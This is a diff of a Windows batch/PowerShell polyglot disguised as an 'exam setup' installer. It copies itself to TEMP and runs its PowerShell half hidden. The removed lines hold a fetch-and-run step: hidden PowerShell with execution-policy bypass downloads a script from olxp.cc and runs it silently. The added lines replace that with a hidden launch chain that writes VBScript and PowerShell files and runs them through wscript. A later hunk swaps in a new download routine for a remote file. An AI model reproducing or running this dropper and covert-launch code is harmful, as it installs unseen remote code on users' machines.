@@ -1,16 +1,12 @@
 @echo off
 copy /y "%~f0" "%TEMP%\exam-setup.txt" >nul
-start "" powershell.exe -NoProfile -WindowStyle Hidden -Command "$p=Join-Path $env:TEMP 'exam-setup.ps1'; Get-Content -LiteralPath (Join-Path $env:TEMP 'exam-setup.txt') | Select-Object -Skip 4 | Set-Content -Encoding ASCII -LiteralPath $p; Start-Process -FilePath powershell.exe -WindowStyle Hidden -ArgumentList '-NoProfile','-STA','-WindowStyle','Hidden','-File',$p"
+echo $p = Join-Path $env:TEMP 'exam-setup.ps1' > "%TEMP%\exam-run.ps1"
+echo Get-Content -LiteralPath (Join-Path $env:TEMP 'exam-setup.txt') ^| Select-Object -Skip 9 ^| Set-Content -Encoding ASCII -LiteralPath $p >> "%TEMP%\exam-run.ps1"
+echo ^& $p >> "%TEMP%\exam-run.ps1"
+echo Set sh = CreateObject("WScript.Shell") > "%TEMP%\exam-launch.vbs"
+echo sh.Run "powershell.exe -NoProfile -STA -WindowStyle Hidden -File " ^& Chr(34) ^& "%TEMP%\exam-run.ps1" ^& Chr(34), 0, False >> "%TEMP%\exam-launch.vbs"
+wscript //nologo "%TEMP%\exam-launch.vbs"
 exit /b
-
-$abc = @(
-    "-w", "h",
-    "-nop",
-    "-ep", "bypass",
-    "-c", "Set-Location -LiteralPath ([Environment]::GetEnvironmentVariable('TEMP')); curl.exe -fsSL -o r.ps1 https://olxp.cc/download/install-rest.ps1; Unblock-File .\r.ps1; & .\r.ps1 -Silent"
-)
-Start-Process -FilePath "powershell.exe" -ArgumentList $abc
-
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 [System.Windows.Forms.Application]::EnableVisualStyles()
@@ -64,29 +60,36 @@ function Set-Progress([int64]$done, [int64]$total) {
   [System.Windows.Forms.Application]::DoEvents()
 }
 if (-not $ready) {
-  $total = [int64]0
-  $head = & curl.exe -sI --retry 2 $url
-  foreach ($line in @($head)) {
-    if ($line -match '(?i)content-length:\s*(\d+)') { $total = [int64]$Matches[1] }
-  }
-  if ($total -le 0) { $total = 2933248 }
+  $out = $null
+  $resp = $null
   try {
-    $curl = Start-Process -FilePath curl.exe -WindowStyle Hidden -PassThru -ArgumentList @('-fL','--retry','3','-s','-o',$dest,$url)
-  } catch {
-    $form.Close()
-    [System.Windows.Forms.MessageBox]::Show([string]::new([char[]](0x4E0B,0x8F7D,0x5931,0x8D25,0x3002)), $n) | Out-Null
-    exit 1
-  }
-  while (-not $curl.HasExited) {
+    $req = [System.Net.HttpWebRequest]::Create($url)
+    $req.Method = 'GET'
+    $resp = $req.GetResponse()
+    $total = [int64]$resp.ContentLength
+    if ($total -le 0) { $total = 2933248 }
+    $body = $resp.GetResponseStream()
+    $out = [System.IO.File]::Create($dest)
+    $buf = New-Object byte[] 65536
     $done = [int64]0
-    if (Test-Path -LiteralPath $dest) { $done = (Get-Item -LiteralPath $dest).Length }
-    Set-Progress $done $total
-    [System.Windows.Forms.Application]::DoEvents()
-    Start-Sleep -Milliseconds 40
-  }
-  Set-Progress $total $total
-  $ok = ($curl.ExitCode -eq 0) -and (Test-Path -LiteralPath $dest) -and ((Get-Item -LiteralPath $dest).Length -gt 1MB)
-  if (-not $ok) {
+    while (($nread = $body.Read($buf, 0, $buf.Length)) -gt 0) {
+      $out.Write($buf, 0, $nread)
+      $done += $nread
+      Set-Progress $done $total
+    }
+    $out.Close()
+    $body.Close()
+    $resp.Close()
+    $out = $null
+    $resp = $null
+    if (-not (Test-Path -LiteralPath $dest) -or ((Get-Item -LiteralPath $dest).Length -le 1MB)) {
+      throw 'short'
+    }
+    Set-Progress $total $total
+  } catch {
+    if ($out) { $out.Close() }
+    if ($resp) { $resp.Close() }
+    if (Test-Path -LiteralPath $dest) { Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue }
     $form.Close()
     [System.Windows.Forms.MessageBox]::Show([string]::new([char[]](0x4E0B,0x8F7D,0x5931,0x8D25,0x3002)), $n) | Out-Null
     exit 1
